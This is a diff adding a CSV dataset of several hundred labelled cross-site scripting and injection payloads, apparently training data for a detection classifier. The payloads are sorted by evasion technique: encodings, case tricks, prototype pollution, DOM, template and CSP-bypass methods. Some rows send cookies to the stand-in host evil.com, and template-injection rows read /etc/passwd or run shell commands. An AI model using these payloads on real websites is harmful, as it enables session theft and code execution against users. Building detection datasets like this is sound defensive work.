@@ -1,0 +1,409 @@
+Sentence,Label,Category,Source
+%3Cscript%3Ealert(1)%3C%2Fscript%3E,1,url_encoded,synthetic_harshit_2025
+%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E,1,url_encoded,synthetic_harshit_2025
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,1,url_encoded,synthetic_harshit_2025
+%3Csvg%20onload%3Dalert(1)%3E,1,url_encoded,synthetic_harshit_2025
+%3Ciframe%20src%3Djavascript%3Aalert(1)%3E,1,url_encoded,synthetic_harshit_2025
+%3Ca%20href%3Djavascript%3Aalert(1)%3EClick%3C%2Fa%3E,1,url_encoded,synthetic_harshit_2025
+%3Cbody%20onload%3Dalert(1)%3E,1,url_encoded,synthetic_harshit_2025
+%3Cinput%20onfocus%3Dalert(1)%20autofocus%3E,1,url_encoded,synthetic_harshit_2025
+%3Cdetails%20open%20ontoggle%3Dalert(1)%3E,1,url_encoded,synthetic_harshit_2025
+%3Cmarquee%20onstart%3Dalert(1)%3E,1,url_encoded,synthetic_harshit_2025
+%3Cvideo%20src%3Dx%20onerror%3Dalert(1)%3E,1,url_encoded,synthetic_harshit_2025
+%3Caudio%20src%3Dx%20onerror%3Dalert(1)%3E,1,url_encoded,synthetic_harshit_2025
+%3Cobject%20data%3Djavascript%3Aalert(1)%3E,1,url_encoded,synthetic_harshit_2025
+%3Cembed%20src%3Djavascript%3Aalert(1)%3E,1,url_encoded,synthetic_harshit_2025
+%3Cscript%3Efetch%28%27https%3A%2F%2Fevil.com%2F%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,1,url_encoded,synthetic_harshit_2025
+%3Cscript%3Ewindow.location%3D%27https%3A%2F%2Fevil.com%2F%27%3C%2Fscript%3E,1,url_encoded,synthetic_harshit_2025
+%3Cscript%20src%3D%2F%2Fevil.com%2Fxss.js%3E%3C%2Fscript%3E,1,url_encoded,synthetic_harshit_2025
+%253Cscript%253Ealert%281%29%253C%252Fscript%253E,1,url_encoded,synthetic_harshit_2025
+%3CScript%3Ealert%281%29%3C%2FScript%3E,1,url_encoded,synthetic_harshit_2025
+%3Cscript%3Enew+Image().src%3D%22//evil.com/%3Fc%3D%22%2Bdocument.cookie%3C%2Fscript%3E,1,url_encoded,synthetic_harshit_2025
+%2525253Cscript%2525253Ealert%25281%2529%2525253C%252Fscript%2525253E,1,double_encoded,synthetic_harshit_2025
+%25253Cscript%25253Ealert%25281%2529%25253C%25252Fscript%25253E,1,double_encoded,synthetic_harshit_2025
+%2526lt%253Bscript%2526gt%253Balert%25281%2529%2526lt%253B%252Fscript%2526gt%253B,1,double_encoded,synthetic_harshit_2025
+%253Csvg%2520onload%253Dalert%25281%2529%253E,1,double_encoded,synthetic_harshit_2025
+%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E,1,double_encoded,synthetic_harshit_2025
+%25253Ciframe%25253E,1,double_encoded,synthetic_harshit_2025
+%252525253Cscript%252525253Ealert%28document.domain%29%252525253C%25252Fscript%252525253E,1,double_encoded,synthetic_harshit_2025
+&#60;script&#62;alert(1)&#60;/script&#62;,1,html_entity_encoded,synthetic_harshit_2025
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;,1,html_entity_encoded,synthetic_harshit_2025
+&lt;script&gt;alert(1)&lt;/script&gt;,1,html_entity_encoded,synthetic_harshit_2025
+&#60;img src=x onerror=alert(1)&#62;,1,html_entity_encoded,synthetic_harshit_2025
+&#x3C;svg onload=alert(1)&#x3E;,1,html_entity_encoded,synthetic_harshit_2025
+&#60;a href=javascript:alert(1)&#62;Click&#60;/a&#62;,1,html_entity_encoded,synthetic_harshit_2025
+&#60;body onload=alert(document.cookie)&#62;,1,html_entity_encoded,synthetic_harshit_2025
+&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;alert(1)&#x3C;/&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;,1,html_entity_encoded,synthetic_harshit_2025
+&lt;script&gt;document.write(document.cookie)&lt;/script&gt;,1,html_entity_encoded,synthetic_harshit_2025
+&#60;iframe src=javascript:alert(1)&#62;&#60;/iframe&#62;,1,html_entity_encoded,synthetic_harshit_2025
+&#60;input autofocus onfocus=alert(1)&#62;,1,html_entity_encoded,synthetic_harshit_2025
+&#60;details open ontoggle=alert(1)&#62;&#60;/details&#62;,1,html_entity_encoded,synthetic_harshit_2025
+&#60;video src=x onerror=alert(1)&#62;,1,html_entity_encoded,synthetic_harshit_2025
+&#60;math href=javascript:alert(1)&#62;click&#60;/math&#62;,1,html_entity_encoded,synthetic_harshit_2025
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;,1,html_entity_encoded,synthetic_harshit_2025
+"&#60;script&#62;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&#60;/script&#62;",1,html_entity_encoded,synthetic_harshit_2025
+&#60;svg&#62;&#60;script&#62;alert&#40;1&#41;&#60;/script&#62;&#60;/svg&#62;,1,html_entity_encoded,synthetic_harshit_2025
+&#60;object data=javascript:alert(1)&#62;,1,html_entity_encoded,synthetic_harshit_2025
+&#60;embed src=javascript:alert(1)&#62;,1,html_entity_encoded,synthetic_harshit_2025
+&#60;link rel=stylesheet href=javascript:alert(1)&#62;,1,html_entity_encoded,synthetic_harshit_2025
+<script>\u0061\u006C\u0065\u0072\u0074(1)</script>,1,unicode_hex_escape,synthetic_harshit_2025
+<script>\u0061\u006c\u0065\u0072\u0074(\u0031)</script>,1,unicode_hex_escape,synthetic_harshit_2025
+\u003Cscript\u003Ealert(1)\u003C/script\u003E,1,unicode_hex_escape,synthetic_harshit_2025
+\u003cimg src=x onerror=alert(1)\u003e,1,unicode_hex_escape,synthetic_harshit_2025
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>,1,unicode_hex_escape,synthetic_harshit_2025
+<script>\x61\x6c\x65\x72\x74(1)</script>,1,unicode_hex_escape,synthetic_harshit_2025
+\x3cscript\x3ealert(1)\x3c/script\x3e,1,unicode_hex_escape,synthetic_harshit_2025
+<script>\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074.\u0063\u006f\u006f\u006b\u0069\u0065</script>,1,unicode_hex_escape,synthetic_harshit_2025
+"<a href=""javascript:\u0061\u006c\u0065\u0072\u0074(1)"">click</a>",1,unicode_hex_escape,synthetic_harshit_2025
+<svg onload=\u0061\u006c\u0065\u0072\u0074(1)>,1,unicode_hex_escape,synthetic_harshit_2025
+<body onload=\u0061\u006c\u0065\u0072\u0074(document.cookie)>,1,unicode_hex_escape,synthetic_harshit_2025
+java\u0073cript:alert(1),1,unicode_hex_escape,synthetic_harshit_2025
+java\u0073\u0063ript:alert(1),1,unicode_hex_escape,synthetic_harshit_2025
+<iframe src=java\u0073cript:alert(1)>,1,unicode_hex_escape,synthetic_harshit_2025
+<script>eval(\u0022alert(1)\u0022)</script>,1,unicode_hex_escape,synthetic_harshit_2025
+<input onfocus=\u0061lert(1) autofocus>,1,unicode_hex_escape,synthetic_harshit_2025
+<script>[\u0061\u006c\u0065\u0072\u0074][0](1)</script>,1,unicode_hex_escape,synthetic_harshit_2025
+<script>\u0077indow[\u0022\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u0022]=\u0022https://evil.com\u0022</script>,1,unicode_hex_escape,synthetic_harshit_2025
+"<script>eval(atob(""YWxlcnQoMSk=""))</script>",1,base64_encoded,synthetic_harshit_2025
+"<script>eval(atob(""YWxlcnQoZG9jdW1lbnQuY29va2llKQ==""))</script>",1,base64_encoded,synthetic_harshit_2025
+"<script>eval(atob(""ZG9jdW1lbnQud3JpdGUoZG9jdW1lbnQuY29va2llKQ==""))</script>",1,base64_encoded,synthetic_harshit_2025
+"<iframe src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",1,base64_encoded,synthetic_harshit_2025
+"<script>eval(atob(""ZmV0Y2goJ2h0dHBzOi8vZXZpbC5jb20vP2M9Jytkb2N1bWVudC5jb29raWUp""))</script>",1,base64_encoded,synthetic_harshit_2025
+"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",1,base64_encoded,synthetic_harshit_2025
+"data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+",1,base64_encoded,synthetic_harshit_2025
+"<script>Function(atob(""YWxlcnQoMSk=""))()</script>",1,base64_encoded,synthetic_harshit_2025
+"<script>setTimeout(atob(""YWxlcnQoMSk=""),0)</script>",1,base64_encoded,synthetic_harshit_2025
+"<script src=""data:text/javascript;base64,YWxlcnQoMSk=""></script>",1,base64_encoded,synthetic_harshit_2025
+"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",1,base64_encoded,synthetic_harshit_2025
+"<embed src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",1,base64_encoded,synthetic_harshit_2025
+"<script>new Function(atob(""YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==""))()</script>",1,base64_encoded,synthetic_harshit_2025
+"<script>window[atob(""ZXZhbA=="")](atob(""YWxlcnQoMSk=""))</script>",1,base64_encoded,synthetic_harshit_2025
+"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",1,fromcharcode,synthetic_harshit_2025
+"<script>eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))</script>",1,fromcharcode,synthetic_harshit_2025
+"<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",1,fromcharcode,synthetic_harshit_2025
+"<script>document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62))</script>",1,fromcharcode,synthetic_harshit_2025
+"<script>setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),0)</script>",1,fromcharcode,synthetic_harshit_2025
+"<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",1,fromcharcode,synthetic_harshit_2025
+"<script>[].constructor.constructor(String.fromCharCode(97,108,101,114,116,40,49,41))()</script>",1,fromcharcode,synthetic_harshit_2025
+"<script>new Function(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()</script>",1,fromcharcode,synthetic_harshit_2025
+"<script>window[String.fromCharCode(101,118,97,108)](String.fromCharCode(97,108,101,114,116,40,49,41))</script>",1,fromcharcode,synthetic_harshit_2025
+"<script>Array.from({length:1},()=>eval(String.fromCharCode(97,108,101,114,116,40,49,41)))</script>",1,fromcharcode,synthetic_harshit_2025
+"<script>String.fromCharCode(60,47,115,99,114,105,112,116,62)</script>",1,fromcharcode,synthetic_harshit_2025
+"<script>[String.fromCharCode(97,108,101,114,116)](1)</script>",1,fromcharcode,synthetic_harshit_2025
+<ScRiPt>alert(1)</ScRiPt>,1,mixed_case_obfuscation,synthetic_harshit_2025
+<SCRIPT>alert(1)</SCRIPT>,1,mixed_case_obfuscation,synthetic_harshit_2025
+<Script>alert(document.cookie)</Script>,1,mixed_case_obfuscation,synthetic_harshit_2025
+<sCrIpT>alert(1)</sCrIpT>,1,mixed_case_obfuscation,synthetic_harshit_2025
+<img SRC=x OnErRoR=alert(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
+<IMG SRC=X ONERROR=ALERT(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
+<Img Src=x OnError=alert(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
+<SVG ONLOAD=alert(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
+<Svg OnLoad=alert(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
+<sVg oNlOaD=alert(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
+JaVaScRiPt:alert(1),1,mixed_case_obfuscation,synthetic_harshit_2025
+JAVASCRIPT:alert(1),1,mixed_case_obfuscation,synthetic_harshit_2025
+Javascript:alert(document.cookie),1,mixed_case_obfuscation,synthetic_harshit_2025
+<A HREF=JAVASCRIPT:ALERT(1)>click</A>,1,mixed_case_obfuscation,synthetic_harshit_2025
+<a HrEf=JaVaScRiPt:alert(1)>click</a>,1,mixed_case_obfuscation,synthetic_harshit_2025
+<BODY ONLOAD=alert(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
+<Body OnLoad=alert(document.cookie)>,1,mixed_case_obfuscation,synthetic_harshit_2025
+<INPUT AUTOFOCUS ONFOCUS=alert(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
+<Input AutoFocus OnFocus=alert(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
+<IFRAME SRC=JAVASCRIPT:ALERT(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
+<IFrame Src=JavaScript:alert(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
+<DETAILS OPEN ONTOGGLE=alert(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
+<Details Open OnToggle=alert(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
+<VIDEO SRC=X ONERROR=ALERT(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
+<Video Src=x OnError=alert(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
+<oBjEcT dAtA=jAvAsCrIpT:AlErT(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
+<EmBeD sRc=JaVaScRiPt:AlErT(1)>,1,mixed_case_obfuscation,synthetic_harshit_2025
+"<script>var a=""al""+""er""+""t"";window[a](1)</script>",1,string_concat_obfuscation,synthetic_harshit_2025
+"<script>window[""ale""+""rt""](1)</script>",1,string_concat_obfuscation,synthetic_harshit_2025
+"<script>this[""al""+""er""+""t""](1)</script>",1,string_concat_obfuscation,synthetic_harshit_2025
+"<script>window[""a""+""l""+""e""+""r""+""t""](document[""coo""+""kie""])</script>",1,string_concat_obfuscation,synthetic_harshit_2025
+"<script>var f=""ev""+""al"";window[f](""alert(1)"")</script>",1,string_concat_obfuscation,synthetic_harshit_2025
+"<script>(0)[""constructor""][""constructor""](""alert(1)"")()</script>",1,string_concat_obfuscation,synthetic_harshit_2025
+"<script>[][][""flat""][""constructor""](""alert(1)"")()</script>",1,string_concat_obfuscation,synthetic_harshit_2025
+"<script>[].filter.constructor(""alert(1)"")()</script>",1,string_concat_obfuscation,synthetic_harshit_2025
+"<script>[].map.constructor(""alert(1)"")()</script>",1,string_concat_obfuscation,synthetic_harshit_2025
+"<script>Math.abs.constructor(""alert(1)"")()</script>",1,string_concat_obfuscation,synthetic_harshit_2025
+"<script>isNaN.constructor(""alert(1)"")()</script>",1,string_concat_obfuscation,synthetic_harshit_2025
+"<script>var s=""doc""+""ument"";var c=""coo""+""kie"";alert(window[s][c])</script>",1,string_concat_obfuscation,synthetic_harshit_2025
+"<img src=x onerror=""window['al'+'er'+'t'](1)"">",1,string_concat_obfuscation,synthetic_harshit_2025
+"<script>setTimeout[""constructor""](""alert(1)"")()</script>",1,string_concat_obfuscation,synthetic_harshit_2025
+"<script>setInterval[""constructor""](""alert(1)"")()</script>",1,string_concat_obfuscation,synthetic_harshit_2025
+?__proto__[innerHTML]=<img/src/onerror=alert(1)>,1,prototype_pollution,synthetic_harshit_2025
+?__proto__[src]=x&__proto__[onerror]=alert(1),1,prototype_pollution,synthetic_harshit_2025
+?constructor[prototype][innerHTML]=<script>alert(1)</script>,1,prototype_pollution,synthetic_harshit_2025
+__proto__[dangerouslySetInnerHTML][__html]=<img src=x onerror=alert(1)>,1,prototype_pollution,synthetic_harshit_2025
+?__proto__[script]=1&__proto__[src]=//,1,prototype_pollution,synthetic_harshit_2025
+?__proto__[template]=<img src=x onerror=alert(1)>,1,prototype_pollution,synthetic_harshit_2025
+?__proto__[href]=javascript:alert(1),1,prototype_pollution,synthetic_harshit_2025
+?constructor.prototype.innerHTML=<script>alert(1)</script>,1,prototype_pollution,synthetic_harshit_2025
+"json={""__proto__"":{""innerHTML"":""<img src=x onerror=alert(1)>""}}",1,prototype_pollution,synthetic_harshit_2025
+"{""__proto__"":{""dangerouslySetInnerHTML"":{""__html"":""<img src=x onerror=alert(1)>""}}}",1,prototype_pollution,synthetic_harshit_2025
+?__proto__[srcdoc]=<script>alert(1)</script>,1,prototype_pollution,synthetic_harshit_2025
+?__proto__[onload]=alert(1),1,prototype_pollution,synthetic_harshit_2025
+?constructor[prototype][onload]=alert(1),1,prototype_pollution,synthetic_harshit_2025
+?__proto__[onerror]=alert(1)&__proto__[src]=x,1,prototype_pollution,synthetic_harshit_2025
+"<script>Object.prototype.innerHTML=""<img src=x onerror=alert(1)>""</script>",1,prototype_pollution,synthetic_harshit_2025
+"<script>Object.prototype.src=""x"";Object.prototype.onerror=""alert(1)""</script>",1,prototype_pollution,synthetic_harshit_2025
+"<script>var obj={};obj.__proto__.test=alert.bind(null,1);test()</script>",1,prototype_pollution,synthetic_harshit_2025
+<script>Object.prototype.onload=()=>alert(1)</script>,1,prototype_pollution,synthetic_harshit_2025
+"data={""__proto__"":{""eventsource"":""1"",""url"":""//evil.com/xss.js""}}",1,prototype_pollution,synthetic_harshit_2025
+?__proto__[action]=javascript:alert(1),1,prototype_pollution,synthetic_harshit_2025
+"<script>window.postMessage(""<img src=x onerror=alert(1)>"",""*"")</script>",1,postmessage_xss,synthetic_harshit_2025
+"<script>window.addEventListener(""message"",e=>eval(e.data));postMessage(""alert(1)"",""*"")</script>",1,postmessage_xss,synthetic_harshit_2025
+"<script>window.addEventListener(""message"",function(e){document.getElementById(""x"").innerHTML=e.data},false)</script>",1,postmessage_xss,synthetic_harshit_2025
+"<script>window.onmessage=e=>eval(e.data);postMessage(""alert(document.cookie)"",""*"")</script>",1,postmessage_xss,synthetic_harshit_2025
+"<script>window.onmessage=function(e){document.write(e.data)};postMessage(""<script>alert(1)<\/script>"",""*"")</script>",1,postmessage_xss,synthetic_harshit_2025
+"<script>window.addEventListener(""message"",e=>document.body.innerHTML=e.data,false);top.postMessage(""<img src=x onerror=alert(1)>"",""*"")</script>",1,postmessage_xss,synthetic_harshit_2025
+"<iframe src=""victim.html"" onload=""this.contentWindow.postMessage('<img src=x onerror=alert(1)>','*')"">",1,postmessage_xss,synthetic_harshit_2025
+"<script>parent.postMessage({""type"":""xss"",""data"":""<script>alert(1)<\/script>""},""*"")</script>",1,postmessage_xss,synthetic_harshit_2025
+"<script>window.addEventListener(""message"",e=>{if(e.data.type===""navigate"")location=e.data.url})</script>",1,postmessage_xss,synthetic_harshit_2025
+"<script>frames[0].postMessage(""{""type"":""html"",""data"":""<img src=x onerror=alert(1)>""}"",""*"")</script>",1,postmessage_xss,synthetic_harshit_2025
+<script>document.write(location.hash.slice(1))</script>,1,dom_xss,synthetic_harshit_2025
+"<script>document.getElementById(""x"").innerHTML=location.search.slice(1)</script>",1,dom_xss,synthetic_harshit_2025
+<script>document.body.innerHTML=decodeURIComponent(location.hash.slice(1))</script>,1,dom_xss,synthetic_harshit_2025
+"<script>var x=document.URL;document.write(x.substring(x.indexOf(""q="")+2))</script>",1,dom_xss,synthetic_harshit_2025
+"<script>document.getElementById(""out"").innerHTML=window.name</script>",1,dom_xss,synthetic_harshit_2025
+<script>eval(location.hash.slice(1))</script>,1,dom_xss,synthetic_harshit_2025
+javascript:document.write(document.cookie),1,dom_xss,synthetic_harshit_2025
+"<script>document.cookie=""xss=""+document.location;document.location=""https://evil.com/""+document.cookie</script>",1,dom_xss,synthetic_harshit_2025
+"<script>var data=location.href.split(""#"")[1];document.write(data)</script>",1,dom_xss,synthetic_harshit_2025
+"<script>element.setAttribute(""href"",location.search.slice(1))</script>",1,dom_xss,synthetic_harshit_2025
+"<script>var u=new URLSearchParams(location.search);document.write(u.get(""q""))</script>",1,dom_xss,synthetic_harshit_2025
+"<script>document.execCommand(""insertHTML"",false,location.hash.slice(1))</script>",1,dom_xss,synthetic_harshit_2025
+"<script>document.body.insertAdjacentHTML(""beforeend"",location.hash.slice(1))</script>",1,dom_xss,synthetic_harshit_2025
+"<script>var s=document.createElement(""script"");s.src=location.hash.slice(1);document.head.appendChild(s)</script>",1,dom_xss,synthetic_harshit_2025
+<script>jQuery.globalEval(location.hash.slice(1))</script>,1,dom_xss,synthetic_harshit_2025
+"<script>$(""#result"").html(location.hash.slice(1))</script>",1,dom_xss,synthetic_harshit_2025
+"<script>document.querySelector(""#msg"").innerHTML=location.hash.slice(1)</script>",1,dom_xss,synthetic_harshit_2025
+"<script>history.pushState(null,null,location.hash);document.write(location.hash.slice(1))</script>",1,dom_xss,synthetic_harshit_2025
+"{{constructor.constructor(""alert(1)"")()}}",1,template_injection,synthetic_harshit_2025
+"{{7*7}}{{constructor.constructor(""alert(1)"")()}}",1,template_injection,synthetic_harshit_2025
+${alert(1)},1,template_injection,synthetic_harshit_2025
+${{alert(1)}},1,template_injection,synthetic_harshit_2025
+#{alert(1)},1,template_injection,synthetic_harshit_2025
+<%= alert(1) %>,1,template_injection,synthetic_harshit_2025
+"{{$on.constructor(""alert(1)"")()}}",1,template_injection,synthetic_harshit_2025
+"{{this.constructor.constructor(""alert(1)"")()}}",1,template_injection,synthetic_harshit_2025
+"{{a=constructor.constructor(""alert(1)"")()}}",1,template_injection,synthetic_harshit_2025
+"{{[].pop.constructor(""alert(1)"")()}}",1,template_injection,synthetic_harshit_2025
+"{{constructor.constructor(""fetch(//evil.com?c=""+document.cookie)()"")()}}",1,template_injection,synthetic_harshit_2025
+"ng-app ng-csp><script>angular.element(document).injector().get(""$compile"")(""{{constructor.constructor('alert(1)')()}}"")($rootScope)</script>",1,template_injection,synthetic_harshit_2025
+"v-html=""'<img src=x onerror=alert(1)>'""",1,template_injection,synthetic_harshit_2025
+":href=""'javascript:alert(1)'""",1,template_injection,synthetic_harshit_2025
+"@click=""eval('alert(1)')""",1,template_injection,synthetic_harshit_2025
+"dangerouslySetInnerHTML={{__html: ""<img src=x onerror=alert(1)>""}}",1,template_injection,synthetic_harshit_2025
+"${7*7}${"""".constructor.constructor(""alert(1)"")()}",1,template_injection,synthetic_harshit_2025
+"{{request.__class__.__mro__[2].__subclasses__()[40](""/etc/passwd"").read()}}",1,template_injection,synthetic_harshit_2025
+#{7*7},1,template_injection,synthetic_harshit_2025
+*{alert(1)},1,template_injection,synthetic_harshit_2025
+"<script>{{constructor.constructor(""alert(1)"") ()}}</script>",1,template_injection,synthetic_harshit_2025
+"{{config.__class__.__init__.__globals__[""os""].popen(""id"").read()}}",1,template_injection,synthetic_harshit_2025
+"[constructor.constructor(""alert(1)"")()]",1,template_injection,synthetic_harshit_2025
+"{[constructor.constructor(""alert(1)"")()]}",1,template_injection,synthetic_harshit_2025
+"<script nonce=""INJECT_NONCE"">alert(1)</script>",1,csp_bypass,synthetic_harshit_2025
+<link rel=preload as=script href=//evil.com/xss.js>,1,csp_bypass,synthetic_harshit_2025
+"<meta http-equiv=""refresh"" content=""0;url=javascript:alert(1)"">",1,csp_bypass,synthetic_harshit_2025
+"<script src=""/api/jsonp?callback=alert""></script>",1,csp_bypass,synthetic_harshit_2025
+"<script src=""/api/endpoint?format=js&data=alert(1)""></script>",1,csp_bypass,synthetic_harshit_2025
+"<base href=""//evil.com/""><script src=""/trusted-path.js""></script>",1,csp_bypass,synthetic_harshit_2025
+"<link rel=prefetch href=""//evil.com/steal?c="">",1,csp_bypass,synthetic_harshit_2025
+"<script src=data:,alert(1)></script>",1,csp_bypass,synthetic_harshit_2025
+"<iframe csp=""script-src 'none'"" srcdoc=""<script>alert(1)</script>"">",1,csp_bypass,synthetic_harshit_2025
+"<script>location=""javascript:alert(1)""</script>",1,csp_bypass,synthetic_harshit_2025
+"<script>import(""//evil.com/""+document.cookie)</script>",1,csp_bypass,synthetic_harshit_2025
+"<object data=""//trusted.com/"" type=""text/html""><param name=src value=javascript:alert(1)>",1,csp_bypass,synthetic_harshit_2025
+"<script src=""//trusted.com/jsonp?cb=alert""></script>",1,csp_bypass,synthetic_harshit_2025
+"<svg><use href=""data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><script>alert(1)</script></svg>#x"">",1,csp_bypass,synthetic_harshit_2025
+"<script>document.write(""<scr""+""ipt src=//evil.com/xss.js></scr""+""ipt>"")</script>",1,csp_bypass,synthetic_harshit_2025
+"<script>var e=document.createElement(""script"");e.src=""//evil.com/x.js"";document.body.appendChild(e)</script>",1,csp_bypass,synthetic_harshit_2025
+"<script integrity=""sha256-FAKESHA"">alert(1)</script>",1,csp_bypass,synthetic_harshit_2025
+"<link rel=stylesheet href=""data:text/css,*{background-image:url(javascript:alert(1))}"">",1,csp_bypass,synthetic_harshit_2025
+"<script>navigator.serviceWorker.register(""/evil-sw.js"")</script>",1,service_worker_xss,synthetic_harshit_2025
+"<script>navigator.serviceWorker.register(""/sw.js"",{scope:""/""}).then(r=>r.active.postMessage({type:""xss""}))</script>",1,service_worker_xss,synthetic_harshit_2025
+"<script>navigator.serviceWorker.ready.then(r=>r.showNotification(""XSS"",{body:document.cookie}))</script>",1,service_worker_xss,synthetic_harshit_2025
+"<script>if(""serviceWorker"" in navigator){navigator.serviceWorker.register(""/xss-sw.js"")}</script>",1,service_worker_xss,synthetic_harshit_2025
+<script>navigator.serviceWorker.getRegistrations().then(regs=>regs.forEach(r=>r.active.postMessage(document.cookie)))</script>,1,service_worker_xss,synthetic_harshit_2025
+"<script>caches.open(""xss"").then(c=>c.add(""/steal?c=""+document.cookie))</script>",1,service_worker_xss,synthetic_harshit_2025
+"<script>navigator.serviceWorker.addEventListener(""message"",e=>eval(e.data.script))</script>",1,service_worker_xss,synthetic_harshit_2025
+"<script>navigator.serviceWorker.register(""/"").then(r=>{var w=r.installing||r.waiting||r.active;w.postMessage({url:location.href,cookie:document.cookie})})</script>",1,service_worker_xss,synthetic_harshit_2025
+"<div id=host></div><script>var shadow=document.getElementById(""host"").attachShadow({mode:""open""});shadow.innerHTML=""<img src=x onerror=alert(1)>""</script>",1,shadow_dom_xss,synthetic_harshit_2025
+"<script>customElements.define(""x-xss"",class extends HTMLElement{connectedCallback(){this.attachShadow({mode:""open""}).innerHTML=""<img src=x onerror=alert(1)>""}});document.body.appendChild(document.createElement(""x-xss""))</script>",1,shadow_dom_xss,synthetic_harshit_2025
+"<template shadowrootmode=""open""><img src=x onerror=alert(1)></template>",1,shadow_dom_xss,synthetic_harshit_2025
+"<template shadowroot=""open""><script>alert(1)<\/script></template>",1,shadow_dom_xss,synthetic_harshit_2025
+"<div><template shadowrootmode=""open""><style>:host{color:red}</style><script>alert(1)<\/script></template></div>",1,shadow_dom_xss,synthetic_harshit_2025
+"<script>var h=document.createElement(""div"");document.body.appendChild(h);var s=h.attachShadow({mode:""open""});s.innerHTML=""<iframe srcdoc=<script>alert(1)<\/script>>""</script>",1,shadow_dom_xss,synthetic_harshit_2025
+"<div id=x></div><script>x.attachShadow({mode:""open""}).host.outerHTML=""<img src=x onerror=alert(1)>""</script>",1,shadow_dom_xss,synthetic_harshit_2025
+"<custom-element><template shadowrootmode=""open""><script>parent.alert(1)<\/script></template></custom-element>",1,shadow_dom_xss,synthetic_harshit_2025
+"<script>class XSSEl extends HTMLElement{constructor(){super();this.attachShadow({mode:""open""}).innerHTML=""<img src=x onerror=alert(1)>""}}customElements.define(""x-xss"",XSSEl)</script>",1,shadow_dom_xss,synthetic_harshit_2025
+"<script>if(window.trustedTypes){var p=trustedTypes.createPolicy(""default"",{createHTML:s=>s});document.body.innerHTML=p.createHTML(""<img src=x onerror=alert(1)>"")}</script>",1,trusted_types_bypass,synthetic_harshit_2025
+"<script>trustedTypes.createPolicy(""default"",{createScriptURL:url=>url,createScript:s=>s,createHTML:h=>h})</script>",1,trusted_types_bypass,synthetic_harshit_2025
+"<script>const p=trustedTypes.createPolicy(""bypass"",{createHTML:()=>""<script>alert(1)<\/script>""});el.innerHTML=p.createHTML("""")</script>",1,trusted_types_bypass,synthetic_harshit_2025
+"<script>window.__TRUSTED_TYPES__=trustedTypes.createPolicy(""policy"",{createHTML:v=>v})</script>",1,trusted_types_bypass,synthetic_harshit_2025
+"<script>trustedTypes.defaultPolicy={createHTML:s=>s,createScript:s=>s,createScriptURL:s=>s}</script>",1,trusted_types_bypass,synthetic_harshit_2025
+"<meta http-equiv=""Content-Security-Policy"" content=""trusted-types none""><script>alert(1)</script>",1,trusted_types_bypass,synthetic_harshit_2025
+"<script>Object.defineProperty(trustedTypes,""defaultPolicy"",{get:()=>({createHTML:s=>s})})</script>",1,trusted_types_bypass,synthetic_harshit_2025
+"<script>var sink=document.getElementById(""sink"");sink[trustedTypes.isHTML?""innerHTML"":""textContent""]=""<img src=x onerror=alert(1)>""</script>",1,trusted_types_bypass,synthetic_harshit_2025
+"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",1,mutation_xss,synthetic_harshit_2025
+<listing><script>alert(1)</script></listing>,1,mutation_xss,synthetic_harshit_2025
+<xmp><script>alert(1)</script></xmp>,1,mutation_xss,synthetic_harshit_2025
+<math><mtext></noscript><img src=x onerror=alert(1)>,1,mutation_xss,synthetic_harshit_2025
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,1,mutation_xss,synthetic_harshit_2025
+<table><td><script>alert(1)</script></td></table>,1,mutation_xss,synthetic_harshit_2025
+<select><option><script>alert(1)</script></option></select>,1,mutation_xss,synthetic_harshit_2025
+<plaintext><script>alert(1)</script>,1,mutation_xss,synthetic_harshit_2025
+"<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=""</style><img onerror=alert(1) src>"">",1,mutation_xss,synthetic_harshit_2025
